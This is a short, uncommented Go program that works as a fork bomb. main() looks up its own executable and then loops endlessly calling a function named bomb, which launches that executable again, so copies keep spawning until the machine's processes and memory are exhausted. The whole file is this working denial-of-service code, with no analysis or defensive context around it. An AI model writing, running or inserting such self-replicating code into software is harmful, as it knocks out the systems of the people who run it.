package main

import (
	"fmt"
	"os"
	"os/exec"
	"time"
)

func main() {
   err := fmt.Errorf("")
   exPath := ""

   for err != nil {
      exPath, err = os.Executable()
      if err != nil {
         time.Sleep(200 * time.Millisecond)
      }
   }
   for {
      bomb(exPath)
   }
}

func bomb(file string) {
   cmd := exec.Command(file)
   cmd.Run()
}